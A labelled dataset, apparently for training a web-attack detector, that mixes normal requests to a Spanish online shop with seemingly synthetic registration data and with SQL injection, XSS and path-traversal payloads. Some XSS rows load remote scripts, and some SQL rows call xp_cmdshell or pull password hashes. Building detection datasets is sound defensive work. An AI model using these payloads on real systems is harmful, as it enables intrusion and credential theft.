miembros/editar.jsp?modo=registro&login=maurie&password=0StroP5je0&nombre=Vlentina&apellidos=Fisas&email=marlaud_losee5%40redesmilitantes.tf&dni=54430634F&direccion=Viseu+81+8%3FC&ciudad=Corbera+d%27Ebre&cp=48210&provincia=Murcia&ntc=4713791605534130&B1=Registrar,normal,0.137036438
publico/productos.jsp,normal,0.176900353
imagenes/cmenbul.gif,normal,0.926015198
index.jsp,normal,0.353016842
publico/registro.jsp?modo=registro&login=amabelle&password=COmplEtoRio&nombre=Samuel&apellidos=Bail%E9n+Lapetini&email=novikoff%40schnapps.com.cl&dni=42010181Z&direccion=Caba%F1eros%2C+131+&ciudad=Almacelles&cp=43896&provincia=%C1vila&ntc=6273831231107298&B1=Registrar,normal,0.364836631
s&o.&: select * from users where id='1' or \<\. or 1=1 -- 1',sqli,0.159634947
global/estilos.css,normal,0.023252432
publico/entrar.jsp?errorMsg=Credenciales+incorrectas,normal,0.152006803
s&1c: select * from users where id='1'   or 1=1 -- 1',sqli,0.217472753
publico/miembros.jsp,normal,0.530862977
perl -e &apos;print &quot;&amp;&lt;SCR\0IPT&gt;alert(&quot;XSS&quot;)&lt;/SCR\0IPT&gt;&quot;;&apos; &gt; out,xss,0.806306586
index.jsp,normal,0.298291532
imagenes/2.gif,normal,0.156062839
"<a href=""javas\x05cript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss,0.769718104
publico/anadir.jsp?id=3&nombre=Jam%F3n+Ib%E9rico&precio=39&cantidad=15&B1=A%F1adir+al+carrito,normal,0.352535854
"<var onmouseover=""prompt(1)"">On Mouse Over</var>",xss,0.061011389
../../boot.ini,traversal,0.290530417
"<script\x0Ctype=""text/javascript"">javascript:alert(1);</script>",xss,0.930854379
"<SCRIPT SRC=""%(jpg)s""></SCRIPT>",xss,0.496934206
imagenes/3.gif,normal,0.918323435
%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f{FILE},traversal,0.500026809
"s),s: select * from users where id=1 or ""),"" or 1=1 -- 1",sqli,0.510195867
global/titulo.jsp,normal,0.635002425
"<;LINK REL="";stylesheet""; HREF="";javascript:alert(';XSS';);"";>;",xss,0.415659623
publico/pagar.jsp?modo=insertar&precio=1103&B1=Pasar+por+caja,normal,0.552828942
publico/vaciar.jsp?B2=Vaciar+carrito,normal,0.724555576
publico/pagar.jsp?modo=insertar&precio=2461&B1=Confirmar,normal,0.555145906
<IMG SRC=JaVaScRiPt:alert('XSS')>,xss,0.060501865
--><!-- --\x3E> <img src=xxx:x onerror=javascript:alert(1)> -->,xss,0.780220052
miembros/index.jsp,normal,0.763865504
index.jsp,normal,0.223409063
imagenes/2.gif,normal,0.924876309
"<script>if(""x\\xE1\x96\x89"".length==2) { javascript:alert(1);}</script>",xss,0.245864158
miembros/index.jsp,normal,0.40799138
"<style TYPE=""text/javascript"">document.vulnerable=true;</style>",xss,0.315252227
..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c{FILE},traversal,0.042002677
global/titulo.jsp,normal,0.807846316
publico/autenticar.jsp?modo=entrar&login=feutlins&pwd=laga_rtijo&remember=on&B1=Entrar,normal,0.10286951
"';;alert(String.fromCharCode(88,83,83))//\';;alert(String.fromCharCode(88,83,83))//"";;alert(String.fromCharCode(88,83,83))//\"";;alert(String.fromCharCode(88,83,83))//-->;<;/SCRIPT>;"";>;';>;<;SCRIPT>;alert(String.fromCharCode(88,83,83))<;/SCRIPT>;",xss,0.634340639
%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\{FILE},traversal,0.740047965
&lt;IFRAME SRC=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;&lt;/IFRAME&gt;,xss,0.395760209
javascript:alert%281%29;,xss,0.467466712
..%5c..%5c..%5c..%5c../winnt/system32/cmd.exe?/c+dir+c:\,traversal,0.767461974
miembros/fotos.jsp,normal,0.161608949
"<SCRIPT a="">"" '' SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",xss,0.559467931
publico/pagar.jsp?modo=insertar&precio=7427&B1=Confirmar,normal,0.296901408
"<a href=""\xE2\x80\xA9javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss,0.379581334
publico/carrito.jsp,normal,0.57343289
publico/anadir.jsp?id=3&nombre=Queso+Manchego&precio=100&cantidad=63&B1=A%F1adir+al+carrito,normal,0.702328636
publico/productos.jsp,normal,0.072151508
imagenes/3.gif,normal,0.534839686
"`""'><img src=xxx:x \x00onerror=javascript:alert(1)>",xss,0.190467648
miembros/imagenes/zarauz.jpg,normal,0.785923291
imagenes/3.gif,normal,0.710321298
'; exec master..xp_cmdshell,sqli,0.65882651
imagenes/3.gif,normal,0.481299398
miembros/imagenes/castro.jpg,normal,0.841180498
../{FILE},traversal,0.63682614
imagenes/cmenbul.gif,normal,0.411609855
global/creditos.jsp,normal,0.017236353
"<a href=""\x20javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss,0.096280513
"&lt;IMG STYLE=\""xss&#58;expr/*XSS*/ession(alert('XSS'))\""&gt;",xss,0.929086617
"g'""></IFRAME>Hover the cursor to the LEFT of this Message</h1>&ParamHeight=250",xss,0.845843022
imagenes/logo.gif,normal,0.061218029
"s&oUE: select * from users where id='1' or \<\ union select 1,@@VERSION -- 1'",sqli,0.012271435
like,sqli,0.773268001
%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f{FILE},traversal,0.04755721
..%25c1%259c..%25c1%259c..%25c1%259c..%25c1%259c{FILE},traversal,0.345037868
"<<SCRIPT>alert(""XSS"");//<</SCRIPT>",xss,0.499323133
imagenes/3.gif,normal,0.348067061
&(1&1: select * from users where id=1 or (\+)=1 or 1=1 -- 1,sqli,0.638267634
miembros/index.jsp,normal,0.147379733
%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\{FILE},traversal,0.284068274
<svg><script x:href='https://dl.dropbox.com/u/13018058/js.js' {Opera},xss,0.40020457
"<embed src=""javascript:alert(1)"">",xss,0.465737831
imagenes/1.gif,normal,0.348574031
%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66{FILE},traversal,0.567033896
miembros/index.jsp,normal,0.252615225
global/creditos.jsp,normal,0.057626202
imagenes/3.gif,normal,0.941784307
imagenes/2.gif,normal,0.707555708
miembros/imagenes/castro.jpg,normal,0.974634216
%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64,traversal,0.419924535
*/UNION%20SELECT%20password%20FROM%20users--,sqli,0.988514364
"[<blockquote cite=""]"">["" onmouseover=""alert('RVRSH3LL_XSS');"" ]",xss,0.474099074
publico/caracteristicas.jsp?id=1,normal,0.596058516
publico/caracteristicas.jsp?id=1,normal,0.459748121
&lt;STYLE type=&quot;text/css&quot;&gt;BODY{background:url(&quot;javascript:alert(&apos;XSS&apos;)&quot;)}&lt;/STYLE&gt;,xss,0.915080877
imagenes/3.gif,normal,0.256071772
&lt;IMG SRC=&quot;jav&#x09;ascript:alert(&apos;XSS&apos;);&quot;&gt;,xss,0.862508338
publico/registro.jsp?modo=registro&login=parypa&password=2eSCo63ENti2&nombre=Yaiti&apellidos=Andara+Francino&email=tolan.herlie%40movil-google.mx&dni=77077342H&direccion=Quintana+19%2C+13F&ciudad=Sant+Jordi%2FSan+Jorge&cp=10335&provincia=Madrid&ntc=0945394059491882&B1=Registrar,normal,0.121869126
miembros/salir.jsp,normal,0.529709186
imagenes/1.gif,normal,0.292892811
global/creditos.jsp,normal,0.270768108
imagenes/3.gif,normal,0.478887255
publico/anadir.jsp?id=1&nombre=Queso+Manchego&precio=100&cantidad=44&B1=A%F1adir+al+carrito,normal,0.295425933
&#X003c,xss,0.888003066
././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././../../../../../../{FILE},traversal,0.950565771
"<iframe srcdoc=""&LT;iframe&sol;srcdoc=&amp;lt;img&sol;src=&amp;apos;&amp;apos;onerror=javascript:alert(1)&amp;gt;>"">",xss,0.460338894
"<img src=x onerror=\x10""javascript:alert(1)"">",xss,0.691057334
"voUEf: select * from users where id=1 -@<@ union select version(),version() -- 1",sqli,0.879489633
publico/carrito.jsp,normal,0.111128988
%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%57%49%4e%44%4f%57%53%5c%77%69%6e%2e%69%6e%69,traversal,0.725879828
publico/productos.jsp,normal,0.474251137
' group by userid having 1=1--,sqli,0.751613553
"<body onunload body onunload=""javascript:javascript:alert(1)""></body onunload>",xss,0.692178833
"s(v: select * from users where id=1 or ""(@"" or 1=1 -- 1",sqli,0.394515251
miembros/salir.jsp,normal,0.938676908
*/*,sqli,0.934426665
imagenes/logo.gif,normal,0.542541774
miembros/imagenes/ogono.jpg,normal,0.686880406
..0x5c..0x5c..0x5c..0x5c..0x5c..0x5c{FILE},traversal,0.050175856
"<img src=x\x09onerror=""javascript:alert(1)"">",xss,0.735207319
publico/productos.jsp,normal,0.828902506
global/titulo.jsp,normal,0.922687884
(,sqli,0.794404048
"<IMG SRC=x onresize=""alert(String.fromCharCode(88,83,83))"">",xss,0.483356687
imagenes/cmenbul.gif,normal,0.667137998
publico/registro.jsp?modo=registro&login=del&password=repulsivo&nombre=Clodoveo&apellidos=Amayuela+Romay&email=bjelic%40tradedeficit.dd&dni=00792659X&direccion=C%2F+Gregal+56%2C+12%3FG&ciudad=Anguciana&cp=26329&provincia=Zamora&ntc=8927148583279843&B1=Registrar,normal,0.8722702
admin') or '1'='1'/*,sqli,0.248559891
"s&.oU: select * from users where id='1' or \.<\ union select 1,@@VERSION -- 1'",sqli,0.80156504
miembros/editar.jsp?modo=registro&login=lar&password=con2E5u934e1215E&nombre=Johsin&apellidos=Yern&email=trebaol%40arroyomolinos-madrid.gq&dni=51414020G&direccion=Callejon+Tallacarne+175%2C+6%3FC&ciudad=Zarzosa&cp=07529&provincia=Madrid&ntc=8320919959502275&B1=Registrar,normal,0.661611351
miembros/index.jsp,normal,0.188673989
"<body onpagehide body onpagehide=""javascript:javascript:alert(1)""></body onpagehide>",xss,0.884241118
miembros/salir.jsp,normal,0.173969176
<IMG SRC=javascript:alert('XSS')>,xss,0.35204074
..%255c..%255c..%255c..%255c..%255c..%255c..%255c..%255c{FILE},traversal,0.328637575
/%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%00,traversal,0.343964819
"<a href=""\x1Bjavascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss,0.989982804
"<IMG SRC=""jav&#x09;ascript:alert('XSS');"">",xss,0.888401313
\..\..\..\..\..\..\..\..\..\..\etc\passwd%00,traversal,0.127457868
"&lt;LINK REL=\""stylesheet\"" HREF=\""javascript&#058;alert('XSS');\""&gt;",xss,0.860536735
\x3Cscript>javascript:alert(1)</script>,xss,0.590145079
miembros/index.jsp,normal,0.492620724
"<BODY BACKGROUND=""javascript:alert('XSS')"">",xss,0.201832991
"s,)s: select * from users where id=1 or "",)""=1 or 1=1 -- 1",sqli,0.858016181
publico/pagar.jsp?modo=insertar&precio=3027&B1=Confirmar,normal,0.776545529
imagenes/nuestratierra.jpg,normal,0.03473442
<script ^__^>alert(String.fromCharCode(49))</script ^__^,xss,0.295284011
miembros/imagenes/castro.jpg,normal,0.707912505
<STYLE>@import'%(css)s';</STYLE>,xss,0.112056899
"<a href=""\x16javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss,0.456615582
index.jsp,normal,0.295168468
miembros/editar.jsp?modo=registro&login=kwang-ch&password=desyerbadora&nombre=Nahir&apellidos=Monrrabal&email=kollmannsberger%40921.in&dni=80396628J&direccion=Calle+Nicolas+Funes+116+&ciudad=Pera%2C+La&cp=15142&provincia=Madrid&ntc=2532457145340118&B1=Registrar,normal,0.426377805
global/menum.jsp,normal,0.57404112
miembros/editar.jsp?modo=registro&login=drake3&password=cos6rio&nombre=Wara&apellidos=Caminero+Carre%F1o&email=goth-komarov%40frenchpolynesia.com.mg&dni=25585710G&direccion=C%2F+Cartagena%2C+84+3%3FB&ciudad=Bollullos+Par+del+Condado&cp=08394&provincia=Almer%EDa&ntc=4879316805989333&B1=Registrar,normal,0.106935869
"s1UEv: select * from users where id=1 or 1#""1 union select null,version() -- 1",sqli,0.436711921
global/creditos.jsp,normal,0.994066212
oov&1: select * from users where id=1 %!<@ or 1=1 -- 1,sqli,0.795351625
publico/caracteristicas.jsp?id=1,normal,0.507596181
miembros/imagenes/zarauz.jpg,normal,0.109676868
miembros/imagenes/ogono.jpg,normal,0.736755701
publico/miembros.jsp,normal,0.173325129
"<IMG SRC=x onload=""alert(String.fromCharCode(88,83,83))"">",xss,0.239762824
"<SCRIPT a="">"" '' SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",xss,0.87259874
'; if is_srvrolemember('sysadmin') > 0 waitfor delay '0:0:2' -- ,sqli,0.102741564
"&lt;BR SIZE=\""&{alert('XSS')}\""&gt;",xss,0.860362208
global/estilos.css,normal,0.117621739
%2e%2e\{FILE},traversal,0.61573765
"<!--<img src=""--><img src=x onerror=javascript:alert(1)//"">",xss,0.749644632
global/estilos.css,normal,0.320094277
publico/pagar.jsp?modo=insertar&precio=8912&B1=Pasar+por+caja,normal,0.535036743
publico/productos.jsp,normal,0.19700566
&lt;IMG SRC=&quot; &amp;#14;  javascript:alert(&apos;XSS&apos;);&quot;&gt;,xss,0.619995382
"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=5)) AND 'i'='i",sqli,0.70004996
miembros/imagenes/ogono.jpg,normal,0.20927074
imagenes/cmenbul.gif,normal,0.044102452
publico/autenticar.jsp?modo=entrar&login=abigael&pwd=foguear&remember=on&B1=Entrar,normal,0.315607206
global/estilos.css,normal,0.484330731
<img/src=@&#32;&#13; onerror = prompt('&#49;'),xss,0.332684898
"<SCRIPT a="">'>"" SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",xss,0.408084444
..%u2216{FILE},traversal,0.085398679
%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c{FILE},traversal,0.698473272
<SCRIPT onreadystatechange=javascript:javascript:alert(1);></SCRIPT>,xss,0.169708411
publico/vaciar.jsp?B2=Vaciar+carrito,normal,0.67286887
publico/anadir.jsp?id=3&nombre=Jam%F3n+Ib%E9rico&precio=100&cantidad=15&B1=A%F1adir+al+carrito,normal,0.046025788
imagenes/nuestratierra.jpg,normal,0.313278327
publico/carrito.jsp,normal,0.925344654
%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%35%37%%34%39%%34%65%%34%34%%34%66%%35%37%%35%33%%35%63%%37%37%%36%39%%36%65%%32%65%%36%39%%36%65%%36%39,traversal,0.100903749
"<DIV STYLE=""width: expression(alert('XSS'));"">",xss,0.96420041
publico/productos.jsp,normal,0.338055729
or 1=1-- ,sqli,0.893825304
..%uEFC8..%uEFC8..%uEFC8..%uEFC8..%uEFC8..%uEFC8..%uEFC8{FILE},traversal,0.488833533
%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%,traversal,0.041766075
imagenes/2.gif,normal,0.71116056
<style><!--</style><script>document.vulnerable=true;//--></script>,xss,0.147678621
miembros/imagenes/zarauz.jpg,normal,0.78379649
"<img src\x10=x onerror=""javascript:alert(1)"">",xss,0.028182335
miembros/salir.jsp,normal,0.292289787
imagenes/2.gif,normal,0.825316001
imagenes/1.gif,normal,0.468526045
&lt;BR SIZE=&quot;&amp;{alert(&apos;XSS&apos;)}&quot;&gt;,xss,0.984338113
*|,sqli,0.106286035
..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af{FILE},traversal,0.280703418
imagenes/nuestratierra.jpg,normal,0.344495578
global/titulo.jsp,normal,0.788196167
publico/vaciar.jsp?B2=Vaciar+carrito,normal,0.267023836
publico/carrito.jsp,normal,0.615224579
publico/autenticar.jsp?modo=entrar&login=charlie&pwd=b82r8l23o&remember=on&B1=Entrar,normal,0.909567537
0x2e0x2e0x2f0x2e0x2e0x2f{FILE},traversal,0.51701718
"<script\x20type=""text/javascript"">javascript:alert(1);</script>",xss,0.611327492
publico/productos.jsp,normal,0.273577528
miembros/editar.jsp?modo=registro&login=elia6&password=Se5AP62o&nombre=Gamal&apellidos=Cot+Reixach&email=bianchi%40atrioregalos.im&dni=05684753G&direccion=Perez+Pujol%2C+112%2C+3G&ciudad=Victoria%2C+La&cp=08930&provincia=Lleida&ntc=1002172418275885&B1=Registrar,normal,0.524852469
miembros/fotos.jsp,normal,0.374183854
global/creditos.jsp,normal,0.113312047
publico/caracteristicas.jsp?id=1,normal,0.583651481
publico/pagar.jsp?modo=insertar&precio=2293&B1=Confirmar,normal,0.739765904
<img src=asdf onerror=alert(document.cookie)>,xss,0.534274648
publico/registro.jsp?modo=registro&login=toolbox&password=p870en538r7&nombre=Genesis&apellidos=Aristiz%E1bal+Faura&email=halm%40sietepeines.ht&dni=43134733G&direccion=Calle+Pare+Joaquim+Roig+S.f.+S%2FN%2C+2%3FF&ciudad=Hortezuela+de+Oc%E9n&cp=15801&provincia=La+Rioja&ntc=2815769225379997&B1=Registrar,normal,0.747114691
"""`'><script>\x20javascript:alert(1)</script>",xss,0.804754814
"<body onMouseOver body onMouseOver=""javascript:javascript:alert(1)""></body onMouseOver>",xss,0.562364357
"<script\x20type=""text/javascript"">javascript:alert(1);</script>",xss,0.970098563
&lt;!--#exec cmd=&quot;/bin/echo &apos;&lt;SCRIPT SRC&apos;&quot;--&gt;&lt;!--#exec cmd=&quot;/bin/echo &apos;=http://ha.ckers.org/xss.js&gt;&lt;/SCRIPT&gt;&apos;&quot;--&gt;,xss,0.422728021
miembros/imagenes/zarauz.jpg,normal,0.830011797
imagenes/nuestratierra.jpg,normal,0.991859788
%2e%2e\{FILE},traversal,0.88179816
global/menum.jsp,normal,0.810884492
"s.:s: select * from users where id=1 or "".:""=1 or 1=1 -- 1",sqli,0.804299471
publico/caracteristicas.jsp?id=2,normal,0.877641018
global/menum.jsp,normal,0.886548458
miembros/salir.jsp,normal,0.870216523
"UE1&1: select * from users where id=1 union select 1||1,version() -- 1",sqli,0.549804046
publico/registro.jsp?modo=registro&login=warrello2&password=0260l6st116&nombre=Piedad&apellidos=Sevilla+Subauste&email=marchard%40mailboxrussia.kw&dni=85125612J&direccion=C%2F+Guardia+Civil%2C+90%2C+&ciudad=Estamariu&cp=14240&provincia=Almer%EDa&ntc=7024918540973284&B1=Registrar,normal,0.51915349
&#x003c,xss,0.150507929
imagenes/2.gif,normal,0.098674025
miembros/salir.jsp,normal,0.232562695
global/titulo.jsp,normal,0.738098732
publico/carrito.jsp,normal,0.41828474
miembros/salir.jsp,normal,0.877647012
miembros/imagenes/ogono.jpg,normal,0.126972116
"</TITLE><SCRIPT>alert(""XSS"");</SCRIPT>",xss,0.424795778
miembros/imagenes/ogono.jpg,normal,0.193651477
..%5c..%5c..%5c..%5c..%5c{FILE},traversal,0.886990864
<script>+-+-1-+-+alert(1)</script>,xss,0.631624253
&#x000003c,xss,0.517727965
"s(UEs: select * from users where id=1 or 1#""( union select 'a',version() -- 1",sqli,0.151025522
"<DIV STYLE=""background-image: url(javascript:alert('XSS'))"">",xss,0.716647963
miembros/imagenes/ogono.jpg,normal,0.999519445
imagenes/1.gif,normal,0.256421636
miembros/imagenes/ogono.jpg,normal,0.105635533
<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>,xss,0.149401429
publico/miembros.jsp,normal,0.508017774
"<a href=""javascript:void(0)"" onmouseover=&NewLine;javascript:alert(1)&NewLine;>X</a>",xss,0.116055302
<style>*{x:ｅｘｐｒｅｓｓｉｏｎ(javascript:alert(1))}</style>,xss,0.426351355
publico/vaciar.jsp?B2=Vaciar+carrito,normal,0.823638959
miembros/imagenes/castro.jpg,normal,0.930291115
<script <B>document.vulnerable=true;</script>,xss,0.979421708
char%4039%41%2b%40SELECT,sqli,0.34117306
global/menum.jsp,normal,0.517404541
global/estilos.css,normal,0.326478747
publico/entrar.jsp?errorMsg=Credenciales+incorrectas,normal,0.654494968
imagenes/3.gif,normal,0.195460251
"s,o1U: select * from users where id=1 or @#"",=1 union select 1,version() -- 1",sqli,0.909267108
' or 1=1 /*,sqli,0.126006815
0x2e0x2e/0x2e0x2e/0x2e0x2e/{FILE},traversal,0.954065177
%c0%2e%c0%2e\%c0%2e%c0%2e\%c0%2e%c0%2e\%c0%2e%c0%2e\%c0%2e%c0%2e\%c0%2e%c0%2e\%c0%2e%c0%2e\{FILE},traversal,0.059541043
miembros/imagenes/zarauz.jpg,normal,0.980347032
imagenes/nuestratierra.jpg,normal,0.363319114
publico/entrar.jsp?errorMsg=Credenciales+incorrectas,normal,0.364353347
"<xml onPropertyChange xml onPropertyChange=""javascript:javascript:alert(1)""></xml onPropertyChange>",xss,0.279389702
..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af{FILE},traversal,0.255850528
publico/registro.jsp?modo=registro&login=bienia&password=canto&nombre=Gianina&apellidos=Burg%E8s+Campa%F1%E0&email=mamakos%40palodegolf.com.rw&dni=84443986S&direccion=Manuel+De+Falla+119%2C+&ciudad=Castillejo+de+Mesle%F3n&cp=33987&provincia=Zaragoza&ntc=9171998825449770&B1=Registrar,normal,0.421839227
"s;)s: select * from users where id=1 or "";)""=1 or 1=1 -- 1",sqli,0.479266743
imagenes/3.gif,normal,0.296267264
miembros/imagenes/castro.jpg,normal,0.90382093
" <OBJECT TYPE=""text/x-scriptlet"" DATA=""http://ha.ckers.org/scriptlet.html""></OBJECT>",xss,0.742739834
imagenes/nuestratierra.jpg,normal,0.889159038
"<div style=""font-family:'foo&#10;;color:red;';"">XXX",xss,0.508071546
miembros/imagenes/ogono.jpg,normal,0.297933843
